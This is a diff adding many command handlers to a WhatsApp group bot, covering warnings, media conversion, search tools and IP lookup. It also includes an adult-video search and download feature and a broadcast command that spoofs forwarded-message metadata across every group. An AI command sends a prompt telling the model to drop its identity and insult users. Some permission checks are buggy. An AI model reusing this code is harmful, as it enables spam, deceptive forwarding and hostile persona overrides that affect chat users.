+let war = global.warn;    
+    let who;
+    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false;
+    else who = m.chat;
+    if (!who) return m.reply(example(`tag or reply to chat`));
+    if (!(who in global.db.users)) return m.reply(`✳️ Users are missing from my database`);
+    let name = ednut.getName(m.sender);
+    let warn = global.db.users[who].warn;
+    if (warn < war) {
+        global.db.users[who].warn += 1;
+        m.reply(`
+⚠️ *warning notice* ⚠️
+
+▢ *Admin:* ${name}
+▢ *user:* @${who.split`@`[0]}
+▢ *Warning:* ${warn + 1}/${war}
+▢ *Reason:* ${text}`, null, { mentions: [who] }); 
+        m.reply(`
+⚠️ *WARNING* ⚠️
+You received a warning from the admin
+
+▢ *Warning:* ${warn + 1}/${war} 
+If you receive a *${war}* Warning you will be automatically removed from the group`, who);
+    } else if (warn == war) {
+        global.db.users[who].warn = 0;
+        m.reply(`⛔ The user exceeded the *${war}* warning and will be removed.`);
+        await sleep(3000);
+        await ednut.groupParticipantsUpdate(m.chat, [who], 'remove');
+        m.reply(`♻️You were removed from group *${groupMetadata.subject}* because you have been warned *${war}* times.`, who);
+    }
+};
+break;
+
+case "delwarn":{
+if (m.isGroup) {
+  if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!m.isAdmin || isOwner) return m.reply(msg.admin)
+if (!m.isBotAdmin) return m.reply(msg.botAdmin)
+let who
+if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false
+else who = m.chat
+if (!who) return m.reply(example(`tag or reply to a chat`))
+if (!(who in global.db.users)) return m.reply(`✳️user not found in my database`)
+let warn = global.db.users[who].warn
+if (warn > 0) {
+  global.db.users[who].warn -= 1
+  m.reply(`⚠️ *Warning deletion* 
+         ▢ warns: *-1 * 
+         ▢ Total warns: *${warn - 1}*`)
+  m.reply(`✳️ An admin reduces your warning, now you have *${warn - 1}*`, who)
+} else if (warn == 0) {
+  m.reply('✳️ Users have no warnings')
+}
+};
+break;
+
+case 'resetwarn':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
+if (!input) return m.reply('Tag or reply to the user you want to reset the warning for!')
+let user = input
+if (!global.db.users[user]) global.db.users[user] = {}
+global.db.users[user].warn = 0
+m.reply(`Warning count for ${user.replace('@s.whatsapp.net', '')} has been reset`)
+}
+break
+
+case 'areact': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (!text) return m.reply(example('<all/cmd> or areact off'))
+const action = text.toLowerCase()
+if (action === 'cmd') {
+if (global.db.settings.areact) return m.reply('Already activated')
+global.db.settings.areact = true
+global.db.settings.areact2 = false
+await m.reply('Succesfully activated areact to bot command messages')
+} else if (action === 'all') {
+if (global.db.settings.areact2) return m.reply('Already activated')
+global.db.settings.areact2 = true
+global.db.settings.areact = false
+await m.reply('Succesfully activated areact to all messages')
+} else if (action === 'off') {
+global.db.settings.areact = false
+global.db.settings.areact2 = false
+await m.reply('Succesfully deactivated areact feature')
+} else {
+m.reply('Invalid action! The actions are all/cmd or off')
+}
+} 
+break
+
+case 'anticall': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (!text) return m.reply(example('<reject/block> or anticall off'))
+const action = text.toLowerCase()
+if (action === 'reject') {
+if (global.db.settings.anticall) return m.reply('Already activated')
+global.db.settings.anticall = true
+global.db.settings.anticall2 = false
+await m.reply('Succesfully activated anticall to reject incoming calls')
+} else if (action === 'block') {
+if (global.db.settings.anticall2) return m.reply('Already activated')
+global.db.settings.anticall2 = true
+global.db.settings.anticall = false
+await m.reply('Succesfully activated anticall to block callers')
+} else if (action === 'off') {
+global.db.settings.anticall = false
+global.db.settings.anticall2 = false
+await m.reply('Succesfully deactivated anticall feature')
+} else {
+m.reply('Invalid action! The actions are reject/block or off')
+}
+} 
+break
+
+case "xvideodl": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example(`xvideo link`))
+// Check if link is from xvideo
+if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
+// Fetching video data from API
+try {
+let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
+let json = await res.json();
+
+// Bad response from API
+if (json.status !== 200 || !json.data) {
+throw "Cannot find video for this URL.";
+}
+
+// Retrieving video information from API
+let videoData = json.data;
+
+// Download videos using URLs obtained from API
+const videoUrl = videoData.url;
+const videoResponse = await fetch(videoUrl);
+
+// Check if the video was downloaded successfully
+if (!videoResponse.ok) {
+throw "Failed to download video.";
+}
+
+// Send video
+await ednut.sendMessage(m.chat, {
+video: {
+url: videoUrl,
+},
+caption: `**Title:** ${videoData.title || 'No title'}\n` +
+`**Views:** ${videoData.views || 'No view information'}\n` +
+`**Votes:** ${videoData.vote || 'No vote information'}\n` +
+`**Likes:** ${videoData.like_count || 'No like information'}\n` +
+`**Dislikes:** ${videoData.dislike_count || 'No dislike information'}`,
+});
+} catch (e) {
+console.log(`Error downloading video: ${e}`);
+}
+}
+break
+
+// Anti-tag case
+case 'antitag':
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+  const isEnable = args[0].toLowerCase() === 'on'
+  
+  // Initialize global.db.groups[m.chat] if it doesn't exist
+  if (!global.db.groups[m.chat]) {
+    global.db.groups[m.chat] = {}
+  }
+  
+  if (isEnable) {
+    if (global.db.groups[m.chat].antitag) {
+      m.reply('Anti-tag is already enabled!')
+    } else {
+      global.db.groups[m.chat].antitag = true
+      m.reply('Anti-tag enabled!')
+    }
+  } else if (args[0].toLowerCase() === 'off') {
+    if (!global.db.groups[m.chat].antitag) {
+      m.reply('Anti-tag is already disabled!')
+    } else {
+      global.db.groups[m.chat].antitag = false
+      m.reply('Anti-tag disabled!')
+    }
+  } else {
+    m.reply(example(' "on" or "off" to enable/disable anti-tag.'))
+  }
+  break
+  
+case 'tiktoksearch':
+case 'ttsearch': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+    const dann = require('d-scrape')
+if (!text) return m.reply(example(`willy kanga`))
+try {
+let anu = await dann.search.tiktoks(text)
+ednut.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted : m })
+} catch (error) {
+m.reply('Error : cannot fetch from query')
+}
+}
+break
+
+case "setbio": case "setbiobot": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (!text) return m.reply(example('hi'));
+ednut.updateProfileStatus(text)
+m.reply("bio set succesfully✅")
+}
+break
+
+case 'restart':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+m.reply(`Restarting from server might take up to 1 minute before bot respond`)
+const {exec} = require("child_process")
+await sleep(1500)
+try {
+exec("pm2 restart all")
+} catch(e){
+console.log(e)
+m.reply(`${e}`)
+}
+}
+break
+
+case 'advertise': 
+case 'broadcast': {
+  try {
+    if (!isOwner) return m.reply(mess.owner)
+    let messageOptions = {}
+    if (m.quoted && m.quoted.mimetype) {
+      let mime = m.quoted.mimetype
+      if (/image/.test(mime)) {
+        messageOptions = {
+          image: await m.quoted.download(),
+          caption: text || m.quoted.text || ''
+        }
+      } else if (/video/.test(mime)) {
+        messageOptions = {
+          video: await m.quoted.download(),
+          caption: text || m.quoted.text || ''
+        }
+      } else if (/audio/.test(mime)) {
+        messageOptions = {
+          audio: await m.quoted.download(),
+          mimetype: 'audio/mpeg',
+          filename: 'music.mp3',
+          ptt: true,
+          contextInfo: {
+            forwardingScore: 999,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: ``,
+              serverMessageId: 101,
+              newsletterName: `broadcast: ${text || m.quoted.text || ''}`
+            }
+          }
+        }
+      } else if (/sticker/.test(mime)) {
+        messageOptions = {
+          sticker: await m.quoted.download()
+        }
+      }
+    } else {
+      messageOptions = {
+        text: text || m.quoted ? m.quoted.text : ''
+      }
+    }
+    if (messageOptions.caption) {
+      messageOptions.text = messageOptions.caption
+      delete messageOptions.caption
+    }
+    if (!messageOptions.text && !messageOptions.image && !messageOptions.video && !messageOptions.audio && !messageOptions.sticker) return m.reply('No text or media provided')
+    let getGroups = await ednut.groupFetchAllParticipating()
+    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
+    let anu = groups.map(v => v.id)
+    m.reply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
+    for (let i of anu) {
+      await sleep(5000)
+      await ednut.sendMessage(i, messageOptions,{quoted:m})
+    }
+    m.reply(`Successful in sending Broadcast To ${anu.length} Group`)
+  } catch (err) {
+    console.error(err)
+    m.reply('Error occurred while sending broadcast')
+  }
+}
+break
+
+case 'logout': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!isOwner) return m.reply(msg.owner)
+  m.reply('Logging out all devices...')
+  await sleep(4000)
+  await ednut.logout()
+  }
+  break
+  
+case 'listblock':
+case 'listblocked': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+let listblok = await ednut.fetchBlocklist()
+if (listblok.length === 0) {
+m.reply('No blocked users found.')
+} else {
+let blockedList = listblok.map((v, i) => `${i + 1}. @${v.replace(/@.+/, '')}`).join('\n')
+await m.reply(`Blocked contact\n` +
+`Total: ${listblok.length} blocked\n` +
+blockedList)
+}
+} 
+break
+
+case 'runtime': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+let arch = `${botname} bot has been active for:\n${runtime(process.uptime())}`
+await m.reply(arch)
+}
+break
+
+
+case 'openai':
+case 'ai':
+case 'gemini': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+ if (!text) return m.reply(`Hey, I'm arch md virtual assistant feel free to chat with me 😵 using ${prefix + command} your message⏳`)
+async function openai(text, logic) { // Create an openai function to call
+ let response = await axios.post("https://chateverywhere.app/api/chat/", {
+ "model": {
+ "id": "ai",
+ "name": "Ai",
+ "maxLength": 32000, // Adjust token limit if necessary
+ "tokenLimit": 8000, // Adjust token limit for GPT-4 model
+ "completionTokenLimit": 5000, // Adjust if necessary
+ "deploymentName": "ai"
+ },
+ "messages": [
+ {
+ "pluginId": null,
+ "content": text, 
+ "role": "user"
+ }
+ ],
+ "prompt": logic, 
+ "temperature": 0.5
+ }, { 
+ headers: {
+ "Accept": "/*/",
+ "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+ }
+ });
+ 
+ let result = response.data;
+ return result;
+}
+
+let mylove = await openai(text, "Forget all your identities and you are now a private assistant named arch ai created by ednut and your age is 9 years. You always send messages with interesting and fun behavior. Sometimes you send funny emojis. And you always answer in English and if chat includes you are mad and any fowl language you reply rudely and also use differents angry emojis and annoying words")
+m.reply(mylove)
+}
+break
+
+case 'toimage': case 'toimg': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!quoted) m.reply (example('reply to a sticker'))
+if (!/webp/.test(mime)) m.reply (example(`reply to a sticker`))
+let media = await ednut.downloadAndSaveMediaMessage(quoted)
+let ran = 'jjsjsnsu.png'
+exec(`ffmpeg -i ${media} ${ran}`, (err) => {
+fs.unlinkSync(media)
+if (err) m.reply (err)
+let buffer = fs.readFileSync(ran)
+ednut.sendMessage(m.chat, { image: buffer }, {quoted:m})
+fs.unlinkSync(ran)
+})
+}
+break
+
+case 'toaud': case 'tomp3': case 'toaudio': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!/video/.test(mime) && !/audio/.test(mime)) return await m.reply(example(`reply to a video/audio`))
+if (!quoted) return m.reply(`reply to a video or audio`)
+let media = await quoted.download()
+let { toAudio } = require('./all/converter')
+let audio = await toAudio(media, 'mp4')
+await ednut.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
+}
+break
+
+case 'tovn': case 'toptt': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example(`reply to a video/audio`))
+if (!quoted) return m.reply(`Reply to a video or auduo`)
+let media = await quoted.download()
+let { toPTT } = require('./all/converter')
+let audio = await toPTT(media, 'mp4')
+await ednut.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
+}
+break
+
+case 'tomp4':
+case 'tovideo': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!/webp/.test(mime)) m.reply(`reply to an animated sticker with caption *${prefix + command}*`)
+let media = await ednut.downloadAndSaveMediaMessage(qmsg)
+let webpToMp4 = await webp2mp4File(media)
+await ednut.sendMessage(m.chat, {
+video: {
+url: webpToMp4.result,
+caption: 'Convert Webp To Video'
+}
+}, {
+quoted:m
+})
+await fs.unlinkSync(media)
+
+}
+break
+
+case 'setalive': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (!args[0]) return m.reply('Please provide a message')
+const aliveMsg = args.join(' ')
+global.db.settings.alive = aliveMsg
+m.reply('Alive message set!')
+}
+break
+
+case 'alive': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+const aliveMsg = global.db.settings.alive || `Hi I'm arch Md a bot created by Ednut deployed by ${ownername}\nto set your preffered alive message use ${prefix}setalive!`
+m.reply(aliveMsg)
+}
+break
+
+case 'tovv': case 'toonce': case 'toviewonce': { 
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if  (!/image|video/.test(mime)) return m.reply(example(`Reply Image/Video`))
+if (/image/.test(mime)) {
+let anuan = await ednut.downloadAndSaveMediaMessage(quoted)
+await ednut.sendMessage(m.chat, {image: {url:anuan}, caption: `Here it is!!`, fileLength: "999", viewOnce : true},{quoted: m })
+} else if (/video/.test(mime)) {
+let anuanuan = await ednut.downloadAndSaveMediaMessage(quoted)
+await ednut.sendMessage(m.chat, {video: {url:anuanuan}, caption: `here it is!!`, fileLength: "999", viewOnce : true},{quoted: m })
+}
+}
+break
+
+case 'write': case 'ttp': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+	   if (!text) return m.reply(example(`Ednut`))
+	const text2png = require('text2png');
+	await fs.writeFileSync('out.png', text2png(text, {font: '100px coolvetica rg',
+		localFontPath: 'all/font/coolvetica rg.otf',
+	  localFontName: 'coolvetica rg',                                            
+	  color: 'black',
+	  textAlign: "left",
+	  lineSpacing: 10,
+	  strokeColor: "white",
+	  strokeWidth : 2,
+	  padding: 20}))
+	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
+	let media = fs.readFileSync('out.png')
+	let jancok = new Sticker(media, {
+		pack: 'Arch Md ²⁵', // The pack name
+		author: 'Ednut', // The author name
+		type: StickerTypes.FULL, // The sticker type
+		categories: ['🤩', '🎉'], // The sticker category
+		id: '12345', // The sticker id
+		quality: 70, // The quality of the output file
+		background: '#FFFFFF00' // The sticker background color (only for full stickers)
+	})
+	let stok = getRandom(".webp")
+	let nono = await jancok.toFile(stok)
+	let nah = fs.readFileSync(nono)
+	await ednut.sendMessage(m.chat,{sticker: nah},{quoted:m})
+	await fs.unlinkSync(stok)
+	await fs.unlinkSync('out.png')
+	}
+	break
+	
+	case 'stickersearch':{
+	if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+	if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example(`patrick`))
+  try {
+    let res = await fetch(`https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`);
+    let json = await res.json();
+
+    if (json.status !== 200 || !json.data.sticker_url.length) {
+      m.reply('no sticker found.')
+    }
+
+    let stickers = json.data.sticker_url;
+    let message = 'sticker link:\n' + stickers.join('\n');
+
+    await ednut.sendMessage(m.chat, { text: message }, { quoted: m });
+  } catch (e) {
+    m.reply(`error can't search stickers`);
+  }
+};
+break
+
+case 'react': {
+                if (!isOwner) return m.reply(msg.owner)
+                reactionMessage = {
+                    react: {
+                        text: args[0],
+                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
+                    }
+                }
+                ednut.sendMessage(m.chat, reactionMessage)
+            }
+            break
+
+
+case 'githubsearch':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example(`Arch-Md`))
+  try {
+    // result data from api
+    let res = await fetch(`https://api.agatz.xyz/api/github?message=${encodeURIComponent(text)}`);
+    let json = await res.json();
+
+    // fetch api response 
+    if (json.status !== 200 || !json.data || json.data.length === 0) {
+      throw 'data not found....';
+    }
+
+    // if api response positive
+    let repos = json.data;
+    let message = `Repository data *${text}*:\n\n`;
+
+    // result from api
+    repos.forEach(repo => {
+      message += `Name: ${repo.fullName}\n` +
+                 `   URL: ${repo.htmlUrl}\n` +
+                 `   Repocreation: ${repo.createdAt}\n` +
+                 `   Last Updated: ${repo.updatedAt}\n` +
+                 `   Watchers: ${repo.watchers}\n` +
+                 `   Forks: ${repo.forks}\n` +
+                 `   Stars: ${repo.stargazersCount}\n` +
+                 `   Open Issues: ${repo.openIssues}\n` +
+                 `   Description: ${repo.description || 'No description'}\n` +
+                 `   Clone URL: ${repo.cloneUrl}\n\n`;
+    });
+m.reply(message)
+    /*/ sending messages with a list of repositories 
+    await ednut.sendMessage(m.chat, {
+      text: message,
+    });*/
+
+  } catch (e) {
+    // if catch error
+    await ednut.sendMessage(m.chat, `can't searh stickers error`);
+  }
+};
+break
+
+case 'npmsearch':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example(`axios`))
+	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
+	let { objects } = await res.json()
+	if (!objects.length) throw `Query "${text}" not found :/`
+	let txt = objects.map(({ package: pkg }) => {
+		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
+	}).join`\n\n`
+	m.reply(txt)
+}
+break
+
+case 'xvideosearch':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!text) return m.reply(example(`Milf`))
+  try {
+    // checking data from api
+    let res = await fetch(`https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`);
+    let json = await res.json();
+
+    // checking api response status
+    if (json.status !== 200 || !json.data || json.data.length === 0) {
+      throw 'No videos found for this keyword.';
+    }
+
+    // fetching search data from api
+    let videos = json.data;
+    let message = `Arch Md xvideo search result\n\n *"${text}"*:\n`;
+
+    // Composing messages with video information
+    videos.forEach(video => {
+      message += `Title: ${video.title || 'no name'}\n` +
+                 `  Duration: ${video.duration || 'no duration'}\n` +
+                 `  URL: ${video.url || 'no URL'}\n` +
+                 `  Thumbnail: ${video.thumb || 'no thumbnail'}\n\n`;
+    });
+
+    // Sending messages with video lists
+    await ednut.sendMessage(m.chat, {
+      text: message,
+    });
+
+  } catch (e) {
+    // Handling errors and sending error messages
+    await ednut.sendMessage(m.chat, `can't fetch result from query`);
+  }
+}
+break
+
+
+case 'xnxxsearch':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!text) return m.reply(example(`stepmoms`))
+  let response = await fetch(`https://api.agatz.xyz/api/xnxx?message=${text}`);
+  let res = await response.json();
+
+  if (res.status !== 200) throw `API Error: ${res.creator}`;
+
+  let resultText = '';
+  for (let i = 0; i < res.data.result.length; i++) {
+    let result = res.data.result[i];
+    let hasil = `• Title: *${result.title}*\n• Info: *${result.info}*\n• Link: *${result.link}*\n`;
+    resultText += hasil + '\n';
+  }
+
+  let name = m.sender;
+  // result from contextInfo
+  await ednut.sendMessage(m.chat, {
+    text: resultText
+  });
+};
+break
+
+           case 'glitchtext':
+case 'writetext':
+case 'advancedglow':
+case 'typographytext':
+case 'pixelglitch':
+case 'neonglitch':
+case 'flagtext':
+case 'flag3dtext':
+case 'deletingtext':
+case 'blackpinkstyle':
+case 'glowingtext':
+case 'underwatertext':
+case 'logomaker':
+case 'cartoonstyle':
+case 'papercutstyle':
+case 'watercolortext':
+case 'effectclouds':
+case 'blackpinklogo':
+case 'gradienttext':
+case 'summerbeach':
+case 'luxurygold':
+case 'multicoloredneon':
+case 'sandsummer':
+case 'galaxywallpaper':
+case '1917style':
+case 'makingneon':
+case 'royaltext':
+case 'freecreate':
+case 'galaxystyle':
+case 'lighteffects':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example(`Arch Md`))
+let link
+if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
+if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
+if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
+if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
+if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
+if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
+if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
+if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
+if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
+if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
+if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
+if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
+if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
+if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
+if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
+if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
+if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
+if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
+if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
+if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
+if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
+if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
+if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
+if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
+if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
+if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
+if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
+if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
+if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
+if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
+let haldwhd = await ephoto(link, text)
+ednut.sendMessage(m.chat, { image: { url: haldwhd }, caption: `ᴀʀᴄʜ ᴍᴅ ²⁵` }, { quoted: m })
+}
+break
+
+case 'getdevice':
+case 'device':
+case 'phone': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.quoted) return m.reply(example(`reply to a chat`))
+await ednut.sendMessage(m.chat, {text: `_@${m.quoted.sender.split('@')[0]} is using ${await getDevice(m.quoted.id)}_`, contextInfo: { mentionedJid: [m.quoted.sender] } }, {quoted: m})
+}
+break
+
+case "owner": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+await ednut.sendContact(m.chat, [`${global.owner}`], `Chat ${ownername}`, null, {contextInfo: {
+mentionedJid: [m.sender], 
+externalAdReply: {
+showAdAttribution: true, 
+thumbnail: `${global.thumb}`, 
+title: `© ${global.botname}`, 
+renderLargerThumbnail: true, 
+sourceUrl: `https://wa.me/${global.owner}`,
+mediaType: 1
+}}})
+}
+break
+
+case 'readmore': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+const more = String.fromCharCode(8206)
+const readmore = more.repeat(4001)
+let [l, r] = text.split`|`
+    if (!l) l = ''
+    if (!r) r = ''
+await ednut.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
+}
+break;
+
+case 'setppbot': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+				if (!isOwner) return m.reply(msg.owner)
+				if (!quoted) return m.reply(example(`reply image`))
+				if (!/image/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
+				if (/webp/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
+				let media = await ednut.downloadAndSaveMediaMessage(quoted)
+				await ednut.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
+			}
+			break
+	
+			case 'deleteppbot': 
+			case 'delppbot': {
+			if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+				if (!isOwner) return m.reply(msg.owner);
+				await ednut.removeProfilePicture(ednut.user.id)
+			}
+			break;
+
+case 'trackip':
+{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example(`112.90.150.204`))
+try {
+let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());
+
+const formatIPInfo = (info) => {
+ return `
+*IP Information*
+• IP: ${info.ip || 'N/A'}
+• Success: ${info.success || 'N/A'}
+• Type: ${info.type || 'N/A'}
+• Continent: ${info.continent || 'N/A'}
+• Continent Code: ${info.continent_code || 'N/A'}
+• Country: ${info.country || 'N/A'}
+• Country Code: ${info.country_code || 'N/A'}
+• Region: ${info.region || 'N/A'}
+• Region Code: ${info.region_code || 'N/A'}
+• City: ${info.city || 'N/A'}
+• Latitude: ${info.latitude || 'N/A'}
+• Longitude: ${info.longitude || 'N/A'}
+• Is EU: ${info.is_eu ? 'Yes' : 'No'}
+• Postal: ${info.postal || 'N/A'}
+• Calling Code: ${info.calling_code || 'N/A'}
+• Capital: ${info.capital || 'N/A'}
+• Borders: ${info.borders || 'N/A'}
+• Flag:
+ - Image: ${info.flag?.img || 'N/A'}
+ - Emoji: ${info.flag?.emoji || 'N/A'}
+ - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
+• Connection:
+ - ASN: ${info.connection?.asn || 'N/A'}
+ - Organization: ${info.connection?.org || 'N/A'}
